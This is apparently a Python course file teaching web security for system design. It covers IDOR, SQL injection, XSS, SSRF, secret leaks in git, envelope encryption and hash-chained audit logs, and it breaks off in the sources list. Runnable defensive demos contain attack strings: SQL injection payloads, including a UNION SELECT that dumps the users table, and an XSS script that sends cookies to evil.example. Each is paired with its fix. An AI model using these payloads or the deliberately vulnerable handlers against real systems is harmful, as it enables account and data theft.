"""S25 security for system design: part B (lessons 4 and 5: authorisation and web attacks, secrets and defence in depth) and the module tail."""
import sysviz as v

LAYERS_VIZ = v.figure(
    720, 250,
    [v.box(10, 20, 700, 40, "Edge: DDoS protection, WAF, rate limits, TLS", "acc", ""),
     v.box(40, 70, 640, 40, "Identity: strong authentication, MFA, short-lived tokens", "acc", ""),
     v.box(70, 120, 580, 40, "Authorisation: checked on every request, tenant scoped, deny by default", "warn", ""),
     v.box(100, 170, 520, 40, "Data: encryption at rest and in transit, key management, least privilege", "ok", ""),
     v.text(360, 236, "Assume each layer will fail some day: the next one must still hold, and logs must show it happened.", "dg-s")],
    "Defence in depth", "No single control is enough: layers, least privilege and visibility")

KEYS_VIZ = v.figure(
    720, 226,
    [v.box(10, 80, 150, 56, "Master key (KMS / HSM)", "bad", "never leaves the vault"),
     v.arrow(160, 108, 200, 108), v.box(200, 80, 160, 56, "Data key (per object/tenant)", "warn", "stored wrapped (encrypted) by the master key"),
     v.arrow(360, 108, 400, 108), v.box(400, 80, 140, 56, "Data", "ok", "encrypted with the data key"),
     v.box(570, 60, 140, 96, "Rotation", "acc", "re-wrap the small data keys; the big data stays untouched"),
     v.text(360, 190, "Compromise one data key: one tenant's data is exposed, not everything. Revoke the master: nothing can be decrypted.", "dg-s")],
    "Envelope encryption", "A small key protects the data; a protected master key protects the small keys")

LESSONS_B = [
    dict(
        title="Authorisation and the attacks that exploit its absence: IDOR, injection, XSS, SSRF",
        tier="hot",
        situation="A user changes `order=1001` to `order=1002` in the address bar and sees someone else's invoice. Another types a quote mark into a search box and dumps the user table. Most breaches are not clever cryptography attacks; they are missing checks that the design should have made impossible to forget.",
        learn=["Broken object-level authorisation (IDOR) and how to prevent the class", "SQL injection and why parameterised queries end it", "Cross-site scripting and output encoding", "SSRF, CSRF and the controls for each"],
        model=[
            "**Authentication** says who you are; **authorisation** says what you may do, and it must be checked **on every request, on the server, for the specific object**. The most common serious flaw is **broken object-level authorisation (IDOR)**: the code checks that you are logged in but not that **this order belongs to you**, so changing an id exposes other people's data. Prevent the whole class by design: scope every query by the caller (`where id = ? and owner = ?`), derive the tenant and user from the **verified token**, never from request parameters, deny by default, centralise policy (RBAC roles, ABAC attributes, or a policy engine) instead of scattering `if` statements, use unguessable ids as defence in depth (not as the control), and test with automated cross-user and cross-tenant attempts.",
            "**Injection** happens when untrusted input becomes part of a command: **SQL injection** (`' OR '1'='1`) rewrites the query. The cure is **parameterised queries** (the database receives the code and the data separately) plus least-privilege database accounts; never build SQL by string concatenation. **Cross-site scripting (XSS)**: untrusted text rendered as HTML runs attacker script in other users' browsers; cure: **encode output for its context**, use frameworks that escape by default, and add a **Content-Security-Policy**. **CSRF** (a malicious site makes your browser send an authenticated request): `SameSite` cookies and anti-CSRF tokens. **SSRF** (the server is tricked into fetching an internal URL such as a cloud metadata endpoint): validate and **resolve** destination addresses, block private and link-local ranges, disallow redirects to them, and use an egress proxy or allowlist. Treat all input as hostile and all output as needing encoding.",
        ],
        analogy="A hotel where the key card opens the front door (authentication) but a receptionist should also check, at every room door, that this guest was assigned that room (authorisation). Injection is a guest writing instructions on the booking form that the clerk then reads aloud as if they were the manager's.",
        sim=None,
        walk=[
            ("Authenticate, then authorise every object", "A logged-in user is not allowed to read every record."),
            ("Scope queries by the caller", "The owner or tenant id comes from the verified identity, not from the request."),
            ("Separate code from data in queries", "Parameterised statements: input is never parsed as SQL."),
            ("Encode output for its context", "HTML, attribute, JavaScript and URL contexts each need the right encoding."),
            ("Restrict what the server will fetch and what the browser will send", "SSRF filters, CSP, SameSite cookies."),
        ],
        groups=[
            dict(title="An IDOR, a SQL injection and an SSRF filter, for real", cmds=[
                dict(c=r'''cd ~/sec && python3 - <<'EOF'
ORDERS = {1001: {'owner': 'ana', 'item': 'laptop', 'total': 1200}, 1002: {'owner': 'ben', 'item': 'phone', 'total': 600}}
def get_order_vulnerable(user, order_id):
    return ORDERS.get(order_id) or 'not found'                                   # checks nothing about who is asking
def get_order_safe(user, order_id):
    o = ORDERS.get(order_id)
    return o if o and o['owner'] == user else 'not found'                         # scoped by the verified caller; same answer for "missing" and "not yours"
print('ben asks for his own order 1002:        ', get_order_vulnerable('ben', 1002))
print('ben tries 1001 (ana\'s), vulnerable code: ', get_order_vulnerable('ben', 1001), '   <- IDOR')
print('ben tries 1001 (ana\'s), scoped query:    ', get_order_safe('ben', 1001))
print('ben asks for his own order, scoped query:', get_order_safe('ben', 1002))
print('enumerating ids 1000..1005 as ben (vulnerable): found %d orders, %d belong to someone else' % (
    sum(1 for i in range(1000, 1006) if isinstance(get_order_vulnerable('ben', i), dict)),
    sum(1 for i in range(1000, 1006) if isinstance(get_order_vulnerable('ben', i), dict) and ORDERS[i]['owner'] != 'ben')))
EOF''',
                     e="The most common serious web flaw, in twelve lines. The vulnerable handler returns whatever order id it is given, so `ben` simply asks for `1001` and reads `ana`'s order; enumerating ids reveals everyone's. The fixed handler is **scoped by the caller's verified identity** and answers `not found` for both a missing order and someone else's (so it does not even confirm that the id exists). Unguessable ids would make enumeration harder, but they are defence in depth, never the control: the control is the ownership check, applied in one central place so no endpoint can forget it.",
                     annot=[("ben tries 1001, vulnerable code: {'owner': 'ana', ...} <- IDOR", "an authenticated user read another user's data by changing an id"),
                            ("ben tries 1001, scoped query: not found", "the check ties the object to the caller; no information leaks"),
                            ("found 2 orders, 1 belong to someone else", "enumeration found data that was never his")]),
                dict(c=r'''cd ~/sec && python3 - <<'EOF'
import sqlite3
db = sqlite3.connect(':memory:')
db.executescript("""create table users(name text, password_hash text, role text);
insert into users values ('ana', 'x91f...', 'user'), ('root', 'a77c...', 'admin');
create table items(id integer, name text); insert into items values (1, 'laptop'), (2, 'phone');""")
def search_vulnerable(q): return db.execute("select id, name from items where name = '" + q + "'").fetchall()      # string concatenation
def search_safe(q):       return db.execute("select id, name from items where name = ?", (q,)).fetchall()          # parameterised
attack1 = "x' OR '1'='1"
attack2 = "x' UNION SELECT name, password_hash FROM users --"
print('normal search "laptop":                 ', search_vulnerable('laptop'))
print('attack  %-40s' % attack1, search_vulnerable(attack1), ' <- returns everything')
print('attack  %-40s' % attack2, search_vulnerable(attack2), ' <- leaks the user table')
print('same attack 2, parameterised query:     ', search_safe(attack2), ' <- the input is just a (non-matching) string')
EOF''',
                     e="SQL injection, end to end with a real database. The vulnerable query pastes user input into the SQL text, so `x' OR '1'='1` changes the **logic** (the condition is always true) and a `UNION SELECT` turns a product search into a dump of the users table, password hashes included. The parameterised version sends the SQL and the value separately: the database never parses the input as SQL, so the same attack string is just a name that matches nothing. Parameterisation, plus a database account with only the rights the application needs, removes this entire class of bugs.",
                     annot=[("normal search \"laptop\": [(1, 'laptop')]", "the query behaves as intended"),
                            ("attack x' OR '1'='1 ... [(1, 'laptop'), (2, 'phone')]", "the input became part of the logic: it returned every row"),
                            ("attack ... UNION SELECT ... [('ana', 'x91f...'), ('root', 'a77c...')]", "a different table was read: data theft through a search box"),
                            ("same attack 2, parameterised query: []", "input is data, never code")]),
                dict(c=r'''cd ~/sec && python3 - <<'EOF'
import html, ipaddress, socket
from urllib.parse import urlparse
print('--- XSS: the same user comment rendered two ways')
comment = '<script>fetch("https://evil.example/steal?c=" + document.cookie)</script>Nice product!'
print('raw into HTML:    ', '<p>' + comment + '</p>')
print('encoded into HTML:', '<p>' + html.escape(comment) + '</p>')
print()
print('--- SSRF: a "fetch this URL for me" feature must refuse internal destinations')
def allowed(url):
    host = urlparse(url).hostname
    try: ips = {ai[4][0] for ai in socket.getaddrinfo(host, None)}
    except socket.gaierror: return 'REFUSE (does not resolve)'
    for ip in ips:
        a = ipaddress.ip_address(ip)
        if a.is_private or a.is_loopback or a.is_link_local or a.is_reserved: return 'REFUSE (%s is internal)' % ip
    return 'allow'
for u in ('http://169.254.169.254/latest/meta-data/', 'http://127.0.0.1:6379/', 'http://10.0.0.5/admin', 'http://localhost/', 'http://[::1]/', 'http://0x7f000001/'):
    print('%-45s %s' % (u, allowed(u)))
EOF''',
                     e="Two more classics. **XSS**: the raw comment becomes a live `<script>` tag in every visitor's browser; the encoded version shows as harmless text (`&lt;script&gt;`). Escape on output, in the right context, by default. **SSRF**: a feature that fetches URLs on the user's behalf can be pointed at the cloud **metadata service** (`169.254.169.254`, which hands out credentials), at `localhost` services such as Redis, or at private addresses. The filter resolves the name **first** and refuses private, loopback and link-local results (note that it also catches the tricky spellings like `0x7f000001`). A complete defence also stops redirects to internal addresses and routes outbound fetches through an egress proxy.",
                     annot=[("raw into HTML: <p><script>fetch(...)</script>...", "the browser would run the attacker's script"),
                            ("encoded into HTML: <p>&lt;script&gt;...", "rendered as text: no code runs"),
                            ("http://169.254.169.254/... REFUSE (169.254.169.254 is internal)", "the cloud metadata endpoint must never be reachable from user-supplied URLs"),
                            ("http://127.0.0.1:6379/ REFUSE / http://0x7f000001/ REFUSE", "loopback in any spelling is refused after resolution")]),
            ]),
        ],
        scenario=dict(
            title="\"Users can read other users' invoices by changing the id in the URL. What went wrong, and how do you prevent this whole class of bug?\"",
            ask="The most common real vulnerability, framed as an incident. They want the cause, the fix, and a systemic prevention.",
            clarify=[("Is the id a sequential integer, and where does the code check ownership?", "Sequential ids make enumeration trivial, but the root cause is a missing ownership check.")],
            think=[("Name it.", "Broken object-level authorisation (IDOR/BOLA): the endpoint authenticates the user but does not authorise access to the specific invoice."),
                   ("Fix this endpoint.", "Query with the caller's identity from the verified session or token: `where id = :id and owner_id = :caller`; return 404 for both missing and not-yours."),
                   ("Prevent the class.", "Make the safe path the default: a data-access layer or repository that requires the caller context and always adds the tenant and owner filter; row-level security in the database as a second barrier; policy checks centralised in middleware or a policy engine rather than per-endpoint code."),
                   ("Defence in depth.", "Unguessable ids (UUIDs) so enumeration is hard; rate limits and anomaly alerts on id scanning; separate roles for support access with audit trails."),
                   ("Test for it.", "Automated authorisation tests that, for every endpoint, call it as user A with user B's object ids and expect 403/404; run in CI; include in code review checklists and periodic penetration tests."),
                   ("Respond.", "Check logs for past exploitation, notify per policy, fix and verify; add detection."),
                   ("Broader.", "Same pattern at tenant level in a multi-tenant system: the tenant id comes only from the token.")],
            answer=["\"This is broken object-level authorisation: the endpoint checks that the caller is logged in but not that the invoice is theirs. I would fix this endpoint by scoping the query by the caller's verified identity, `where id = :id and owner_id = :caller`, returning not found for both missing and not-yours so it does not leak existence.",
                    "To prevent the class I would make the safe way the default: a data-access layer that requires the caller context and always applies the owner or tenant filter, row-level security in the database as a second barrier, and centralised policy checks. Unguessable ids and rate limits on id scanning add depth. Then I would add automated tests that call every endpoint as one user with another user's object ids and expect a refusal, run them in CI, check the logs for past exploitation, and add detection for enumeration.\""],
            follow=[("Why return 404 instead of 403?", "403 confirms that the object exists; 404 for both cases leaks nothing. Choose by whether existence is sensitive."),
                    ("What is row-level security?", "A database feature that automatically applies a policy to every query on a table (for example `tenant_id = current_setting('app.tenant')`), so even a buggy query cannot see other tenants' rows."),
                    ("RBAC or ABAC?", "RBAC assigns permissions to roles (simple, coarse); ABAC decides from attributes of user, object and context (flexible, more complex); many systems use RBAC plus ownership or tenant checks.")],
            slips=["Hiding the id (UUIDs) as the only fix.", "Checking permissions in the UI only.", "Fixing one endpoint without a systemic prevention."],
        ),
        quick=[
            ("What is IDOR?", "Accessing another user's object by changing an identifier, because the server authenticates but does not authorise the specific object."),
            ("What ends SQL injection?", "Parameterised queries (and least-privilege database accounts)."),
            ("What does an SSRF filter do?", "Resolves the destination and refuses private, loopback and link-local addresses (and redirects to them)."),
        ],
        traps=[
            "Authorisation checks only in the front end or only on the list page, not on the detail endpoint.",
            "Taking the tenant id or role from a request parameter or header the client controls.",
            "Escaping input on the way in instead of encoding output in its context.",
        ],
    ),
    dict(
        title="Secrets, encryption and defence in depth: protecting data when something fails",
        tier="hot",
        situation="A developer commits a cloud key and deletes it in the next commit. A laptop is stolen with a database dump on it. An insider exports the customer table. Security architecture is the set of layers and habits that make each of these a contained incident instead of a headline.",
        learn=["Why a secret in git history is a leaked secret", "Envelope encryption and key rotation", "Tamper-evident audit logs", "Defence in depth, least privilege and incident readiness"],
        model=[
            "A **secret** (password, API key, private key, token) must live in a **secret manager** (injected at runtime, access-controlled, audited, rotated), never in source code, images, chat or logs. A secret committed to git is **compromised forever**: deleting it in a later commit leaves it in history, forks and caches, so the response is to **rotate it immediately**, then clean up. Prevent with **pre-commit and CI secret scanning**, short-lived **credentials** (workload identity, tokens that expire) instead of long-lived keys, and least-privilege scopes so one leak has a small blast radius.",
            "Encrypt data **in transit** (TLS) and **at rest**. Use **envelope encryption**: each object or tenant has its own **data key**; data keys are stored **wrapped (encrypted)** by a **master key** held in a **KMS or HSM** that never releases it. Benefits: compromise of one data key exposes one tenant, rotating the master key re-wraps only the small keys (the bulk data is untouched), and every use of the master key is **audited**. Add **tamper-evident audit logs** (append-only, shipped off the machine, each entry chained by hash to the previous) so that actions are attributable and edits are detectable. **Defence in depth** and **least privilege** hold it together: edge protection and rate limits, strong identity, per-request authorisation, encrypted data with managed keys, network segmentation, and **detection and response** (alerts, runbooks, rehearsed incident response), because every control will fail eventually.",
        ],
        analogy="A bank vault inside a locked building inside a gated compound with cameras. Every door has its own key, every key use is logged, and the small keys to the safe-deposit boxes are kept in the vault, so changing the vault's lock does not mean opening every box.",
        visual=[LAYERS_VIZ, KEYS_VIZ],
        sim=None,
        walk=[
            ("Keep secrets out of code", "Secret manager, injected at runtime, scoped and rotated."),
            ("Scan before and after commit", "Pre-commit hooks and CI scanning; alerts on pushed secrets."),
            ("Rotate first when one leaks", "Revoke and replace; then investigate use; then clean history."),
            ("Encrypt with managed keys", "Envelope encryption: data keys wrapped by a KMS master key; audited use."),
            ("Log tamper-evidently and rehearse response", "Chained audit logs, alerts, and a practised incident runbook."),
        ],
        groups=[
            dict(title="A secret in git history, envelope encryption, and a tamper-evident log", cmds=[
                dict(volatile=True, c=r'''mkdir -p ~/sec/repo && cd ~/sec/repo && git init -q . && git config user.email dev@example.com && git config user.name dev
printf 'DB_HOST=db.internal\nAWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n' > config.env
git add config.env && git commit -q -m "add config"
printf 'DB_HOST=db.internal\n' > config.env && git commit -q -am "remove the secrets (oops, too late)"
echo "--- the file in the latest commit:"; cat config.env
echo "--- but the history still has the key:"
git log --oneline | cat
git log -p -S'AKIA' --format='commit %h' | grep -E "^(commit|[-+]AWS_ACCESS)" | head -4
echo "--- a scanner for all history (key id pattern: AKIA + 16 characters):"
git rev-list --all | while read c; do git grep -hE 'AKIA[0-9A-Z]{16}' $c -- 2>/dev/null; done | sort -u | sed 's/^/found: /'
echo "(these are AWS's documented example credentials; a real leak means rotate the key immediately)"''',
                     e="The classic mistake in three commits. The key is committed, then \"removed\" in the next commit, so the **latest file looks clean**, but `git log -p -S` still finds it and a simple scan over every commit extracts it. Anyone who ever cloned the repository, every fork, every CI cache and every backup has the secret. The correct response is **not** rewriting history first: it is to **rotate the credential at once** (revoke the old key, issue a new one), check the provider's logs for use of the old one, and only then clean up. (The strings here are the example credentials from AWS's own documentation, not real ones.)",
                     annot=[("DB_HOST=db.internal", "the latest commit looks clean"),
                            ("commit d0d4f80 / +AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE", "the first commit still contains the key (and the later commit shows the line being removed)"),
                            ("found: AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE", "a scan over all history finds what a look at the current file does not")]),
                dict(volatile=True, c=r'''mkdir -p ~/sec/env && cd ~/sec/env
echo "customer records: alice 4111..., bob 5500..., carol 3400..." > data.txt
echo "--- envelope encryption: 1. a random data key encrypts the data; 2. a master key wraps (encrypts) the data key"
DK=$(openssl rand -hex 32); MK1=$(openssl rand -hex 32)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:$DK -in data.txt -out data.enc
echo -n "$DK" | openssl enc -aes-256-cbc -pbkdf2 -pass pass:$MK1 -out datakey.wrapped
echo "stored: data.enc ($(stat -c %s data.enc) bytes, ciphertext) and datakey.wrapped ($(stat -c %s datakey.wrapped) bytes); the plaintext data key is NOT stored"
echo "--- decrypt: unwrap the data key with the master key, then decrypt the data"
UK=$(openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:$MK1 -in datakey.wrapped); openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:$UK -in data.enc
echo "--- ROTATE the master key: only the small wrapped data key is re-encrypted; the data file is untouched"
before=$(sha256sum data.enc | cut -c1-16); MK2=$(openssl rand -hex 32)
echo -n "$UK" | openssl enc -aes-256-cbc -pbkdf2 -pass pass:$MK2 -out datakey.wrapped
after=$(sha256sum data.enc | cut -c1-16)
echo "data.enc checksum before: $before   after: $after   (identical: no bulk re-encryption needed)"
UK2=$(openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:$MK2 -in datakey.wrapped); openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:$UK2 -in data.enc
echo "--- the OLD master key can no longer unwrap the data key:"
openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:$MK1 -in datakey.wrapped 2>&1 | head -1''',
                     e="Envelope encryption with real AES. A random **data key** encrypts the data; a **master key** encrypts (wraps) the data key; only the ciphertext and the wrapped key are stored. Decryption unwraps first. The payoff shows in rotation: changing the master key re-encrypts only the 32-byte data key, so the **checksum of the large data file is unchanged**, and the old master key now fails with a `bad decrypt` error. In a real system the master key never leaves a KMS or HSM, which also logs every use. (This demo uses AES-CBC from `openssl enc`, which does not authenticate the ciphertext; production systems use an authenticated mode such as AES-GCM through a KMS library.)",
                     annot=[("stored: data.enc (...) and datakey.wrapped (...); the plaintext data key is NOT stored", "only ciphertext and the wrapped key are kept"),
                            ("customer records: alice ...", "unwrap then decrypt recovers the data"),
                            ("data.enc checksum before: X after: X (identical)", "rotation re-wrapped only the small key: no bulk re-encryption"),
                            ("bad decrypt", "the retired master key can no longer unwrap the data key")]),
                dict(c=r'''python3 - <<'EOF'
# A tamper-evident audit log: each entry includes the hash of the previous one, so editing any entry breaks every hash after it.
import hashlib, json
def add(log, event):
    prev = log[-1]['hash'] if log else '0' * 64
    body = json.dumps({'event': event, 'prev': prev}, sort_keys=True)
    log.append({'event': event, 'prev': prev, 'hash': hashlib.sha256(body.encode()).hexdigest()})
def verify(log):
    prev = '0' * 64
    for i, e in enumerate(log):
        body = json.dumps({'event': e['event'], 'prev': prev}, sort_keys=True)
        if e['prev'] != prev or e['hash'] != hashlib.sha256(body.encode()).hexdigest(): return 'BROKEN at entry %d' % i
        prev = e['hash']
    return 'intact (%d entries)' % len(log)
log = []
for ev in ('ana logged in', 'ana exported customers.csv', 'ben changed role of cho to admin', 'ana logged out'): add(log, ev)
print('audit log:', verify(log))
log[1]['event'] = 'ana viewed dashboard'                          # an insider edits the record of the export
print('after an insider edits entry 1:', verify(log))
EOF''',
                     e="Why audit logs need structure as well as storage. Each entry carries the hash of the previous entry, so editing the record of the customer export **breaks the chain from that entry onwards** and verification names the first broken entry. This is the core idea behind tamper-evident logs and ledgers; production systems also ship entries to a separate, append-only store so an attacker who owns one machine cannot rewrite history there.",
                     annot=[("audit log: intact (4 entries)", "every hash links to the one before"),
                            ("after an insider edits entry 1: BROKEN at entry 1", "the edit is detected and located")]),
            ]),
        ],
        scenario=dict(
            title="\"Design the security architecture for a SaaS that stores payment and personal data. Where would you spend your effort?\"",
            ask="The capstone security question. They want layers, data protection, access control, detection and a prioritised plan.",
            clarify=[("What data classes exist, which regulations apply (PCI, GDPR), and who are the adversaries?", "Payment data: use a payment provider so card numbers never touch your systems; personal data: minimise and protect.")],
            think=[("Reduce the attack surface first.", "Do not store what you do not need: tokenise cards through the payment provider (smaller PCI scope), collect minimal personal data, delete on schedule."),
                   ("Identity and access.", "SSO and MFA for staff, short-lived credentials, least privilege, just-in-time elevated access with approval and audit, no shared accounts; strong customer authentication with passkeys or MFA."),
                   ("Application layer.", "Central authorisation with tenant isolation, parameterised queries, output encoding, dependency and image scanning, secure defaults, rate limits and a WAF at the edge."),
                   ("Data protection.", "TLS everywhere including mTLS internally; encryption at rest with envelope keys per tenant in a KMS; secrets in a manager; backups encrypted and tested; separate production data from test data."),
                   ("Detection and response.", "Central tamper-evident audit logs, alerting on anomalies (impossible travel, mass exports, privilege changes), an incident response plan with roles, rehearsals and customer notification procedures."),
                   ("Operations and people.", "Patch management, infrastructure as code with reviews, secrets scanning, periodic penetration tests and a bug bounty, security training, offboarding."),
                   ("Prioritise.", "Start with the controls that stop the most common breaches (MFA, authorisation, patching, secrets hygiene, backups), then the rest; measure and revisit with a threat model.")],
            answer=["\"First I reduce what there is to protect: card data is tokenised through the payment provider so it never touches our systems, and we collect and keep as little personal data as possible. Then layers. Identity: SSO and MFA for staff, short-lived credentials, least privilege and audited just-in-time elevation; passkeys or MFA for customers. Application: central authorisation with tenant isolation, parameterised queries, output encoding, scanning of dependencies and images, rate limits and a WAF at the edge.",
                    "Data: TLS everywhere with mTLS internally, encryption at rest with per-tenant envelope keys in a KMS, secrets in a manager, tested encrypted backups. Detection and response: tamper-evident audit logs, alerts on mass exports and privilege changes, and a rehearsed incident response plan. I would prioritise the controls that stop the most common breaches, MFA, authorisation, patching, secrets hygiene and backups, and drive the rest from a threat model, with regular penetration tests.\""],
            follow=[("What is least privilege in practice?", "Every identity (human or workload) has only the permissions needed, for the time needed: scoped roles, short-lived credentials, no standing admin access."),
                    ("How do you handle a leaked credential?", "Revoke and rotate immediately, review the provider's logs for use, assess impact, then clean up history and fix the process that allowed it."),
                    ("How do you know your controls work?", "Test them: authorisation tests in CI, penetration tests, red-team exercises, backup restores and incident drills; measure time to detect and respond.")],
            slips=["A list of tools with no prioritisation.", "Storing card numbers instead of tokenising.", "No detection or incident response."],
        ),
        quick=[
            ("What do you do first when a secret is pushed to git?", "Revoke and rotate it immediately; deleting the commit is not enough."),
            ("Why use envelope encryption?", "A compromised data key exposes limited data, and rotating the master key only re-wraps small keys."),
            ("What makes an audit log tamper-evident?", "Each entry includes the hash of the previous one, and logs are shipped to a separate append-only store."),
        ],
        traps=[
            "Treating \"removed from the repository\" as \"no longer exposed\".",
            "Long-lived access keys with broad permissions: one leak is a full compromise.",
            "Security reviews that stop at design: nobody tests the controls or rehearses the response.",
        ],
    ),
]

TAIL = dict(
    cases=[],
    cheat=[
        ["password storage", "Argon2id / scrypt / bcrypt, per-user salt, ~100 ms, never fast hashes or encryption"],
        ["salt / pepper", "per-user random value stored with the hash / secret kept outside the database"],
        ["TOTP", "HMAC(shared secret, 30 s counter), 6 digits; passkeys are phishing resistant"],
        ["session vs JWT", "opaque id on the server (revocable) vs signed claims (stateless, expire soon)"],
        ["JWT checks", "expected alg, signature, exp, iss, aud, scope: never trust alg in the token"],
        ["OAuth + PKCE", "limited tokens without sharing passwords; code exchanged with a verifier"],
        ["TLS verifies", "chain to a trusted CA, hostname, validity dates; never skip it"],
        ["mTLS", "both sides present certificates: service identity; automate rotation"],
        ["cert expiry", "monitor days left, renew automatically, rehearse"],
        ["authN vs authZ", "who you are vs what you may do, per object, on the server"],
        ["IDOR", "scope every query by the verified caller; test cross-user and cross-tenant"],
        ["SQL injection", "parameterised queries, least-privilege database users"],
        ["XSS", "encode output in context, CSP, escaping frameworks"],
        ["CSRF / SSRF", "SameSite and tokens / resolve and block internal addresses"],
        ["secrets", "secret manager, short-lived credentials, scanning; a leaked secret is rotated"],
        ["envelope encryption", "data keys wrapped by a KMS master key; rotate by re-wrapping"],
        ["audit log", "append-only, off-box, hash-chained"],
        ["defence in depth", "edge, identity, authorisation, data, detection: assume each fails"],
        ["least privilege", "minimum rights, minimum time, audited elevation"],
        ["zero trust", "authenticate and authorise every call, even inside the network"],
    ],
    interview_intro="Security answers are judged on layers and prioritisation: say what you protect, who the adversary is, which controls stop the common breaches first, how each layer fails and how you would know. The worked scenarios in each lesson are the models to practise with.",
    interview=[
        dict(q="How should we store user passwords, and make a database leak survivable?",
             a=["Store a verifier: Argon2id, scrypt or bcrypt with a per-user salt, tuned to about 100 ms; not SHA-256, not encryption.", "Rate limit and lock out, check breached passwords, pepper in a secret manager, constant-time compare.", "Second factor (TOTP, passkeys), recovery no weaker than login, rehash on login, alert on credential stuffing; prefer delegating to an identity provider."],
             follow=["What is a pepper?", "Why are passkeys better?"], mistakes=["SHA-256 plus salt.", "Encrypting passwords."],
             angle="Reported by candidates as a standard security opener at large companies; not official."),
        dict(q="Design authentication and authorisation for a multi-tenant SaaS API with web, mobile and partner clients.",
             a=["Identity provider (OIDC) for login, MFA and SSO; authorisation code with PKCE for apps, short-lived access tokens, rotating refresh tokens; client credentials or hashed scoped API keys for partners; mTLS for high trust.", "Gateway validates signature with expected algorithm and JWKS keys, expiry, issuer, audience, scopes; tenant id only from the token; scoped queries, row-level security and cross-tenant tests.", "Revocation by short lifetimes, refresh revocation and emergency denylist; audit logs; no secrets in tokens."],
             follow=["Where should a browser app keep tokens?", "What is PKCE for?"], mistakes=["Role from a request parameter.", "Long-lived access tokens."]),
        dict(q="How do you secure traffic between 40 internal services, and what happens when a certificate expires?",
             a=["mTLS with per-workload identities, short-lived certificates from a private CA, automated issuance and rotation (mesh or cert manager); authorisation policies deny by default.", "Monitor days to expiry and alert early, renew automatically and rehearse; break-glass procedure; CA outage must not stop existing traffic; watch clock skew.", "Public TLS at the edge with automated certificates and re-encryption behind it."],
             follow=["What does a service mesh do?", "What is forward secrecy?"], mistakes=["Disabling verification.", "Manual rotation."],
             angle="Amazon-style: expect \"what did the last expired certificate outage teach you?\"; reported by candidates, not official."),
        dict(q="Users can read each other's invoices by changing the id in the URL. What happened and how do you prevent the class?",
             a=["Broken object-level authorisation: authenticated but not authorised for that object.", "Fix by scoping the query to the verified caller; same response for missing and not yours.", "Prevent the class: data-access layer requiring caller context, row-level security, central policy, UUIDs as depth only, automated cross-user tests, logs checked for exploitation."],
             follow=["404 or 403?", "RBAC or ABAC?"], mistakes=["UUIDs as the only fix.", "UI-only checks."]),
        dict(q="A developer pushed a cloud key to a public repository and removed it in the next commit. What do you do?",
             a=["Rotate the key immediately (revoke, replace); deleting the commit is not enough because history, forks and caches keep it.", "Check the provider's logs for use of the key, assess impact, notify as required.", "Then prevent: pre-commit and CI secret scanning, short-lived credentials, least-privilege scopes, secret manager; clean history afterwards."],
             follow=["How do you scan history?", "What is the blast radius of this key?"], mistakes=["Rewriting history and calling it done."]),
        dict(q="Design the security architecture for a SaaS storing payment and personal data. Where do you spend effort first?",
             a=["Reduce the attack surface: tokenise cards through a provider, minimise personal data, delete on schedule.", "Layers: SSO and MFA, least privilege and audited elevation; central authorisation and tenant isolation, injection and XSS defences, scanning, edge limits; TLS and mTLS, per-tenant envelope keys in a KMS, secrets manager, tested backups.", "Detection and response: tamper-evident audit logs, anomaly alerts, rehearsed incident response; prioritise MFA, authorisation, patching, secrets hygiene, backups; threat model and penetration tests."],
             follow=["What is least privilege in practice?", "How do you know the controls work?"], mistakes=["A list of tools with no priorities.", "No response plan."],
             angle="Google-style: candidates commonly report follow-ups on threat modelling and trade-offs; reported by candidates, not official."),
    ],
    selftest=[
        ("Why is SHA-256 a poor password hash?", "It is fast: attackers can try billions of guesses per second."),
        ("What does a salt prevent?", "Precomputed tables and equal hashes for equal passwords."),
        ("What does a JWT verifier check?", "Signature with the expected algorithm, exp, iss, aud and scope."),
        ("Why is `alg: none` dangerous?", "A verifier that trusts the token's own header accepts an unsigned token."),
        ("What does OAuth let an app do?", "Obtain limited, revocable access without seeing the user's password."),
        ("What three things does TLS verification check?", "Chain to a trusted CA, hostname match, validity dates."),
        ("What does mTLS add?", "Client certificates: both sides authenticate."),
        ("What is IDOR?", "Reading another user's object by changing an id, because authorisation is missing."),
        ("What ends SQL injection?", "Parameterised queries."),
        ("What prevents XSS?", "Encoding output for its context (and a Content-Security-Policy)."),
        ("What does an SSRF filter refuse?", "Private, loopback and link-local destinations, after resolving the name."),
        ("What is the first response to a leaked secret?", "Rotate it immediately."),
        ("Why use envelope encryption?", "Rotation re-wraps only small data keys, and one data key exposes limited data."),
        ("What makes an audit log tamper-evident?", "Hash chaining and an off-box append-only store."),
    ],
    recall=[
        ["passwords", "Argon2id/scrypt/bcrypt + salt"],
        ["JWT", "verify alg, sig, exp, aud, scope"],
        ["OAuth", "limited tokens, PKCE"],
        ["TLS", "chain, name, dates"],
        ["mTLS", "both sides prove identity"],
        ["IDOR", "scope queries by the caller"],
        ["injection", "parameterise"],
        ["XSS", "encode output"],
        ["SSRF", "block internal addresses"],
        ["secret leaked", "rotate first"],
        ["envelope encryption", "wrap data keys with a KMS key"],
        ["defence in depth", "layers, least privilege, detection"],
    ],
    sources=[
        dict(title="OWASP Top 10", url="https://owasp.org/www-project-top-ten/", use="The standard list of the most common web application risks", license="CC BY-SA; read online", how="Link only"),
        dict(title="OWASP Cheat Sheet Series: Password Storage", url="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html", use="Current guidance on hashing algorithms and parameters", license="CC BY-SA; read online", how="Link only"),
        dict(title="RFC 6238: TOTP", url="https://www.rfc-editor.org/rfc/rfc6238", use="The algorithm and test vectors used in the lesson", license="IETF; read online", how="Link only"),
        dict(title="RFC 7519: JSON Web Token", url="https://www.rfc-editor.org/rfc/rfc7519", use="The JWT format and claims", license="IETF; read online", how="Link only"),
        dict(title="OAuth 2.0 Security Best Current Practice (RFC 9700)", url="https://www.rfc-editor.org/rfc/rfc9700", use="PKCE and the current recommendations for OAuth deployments", license="IETF; read online", how="Link only"),
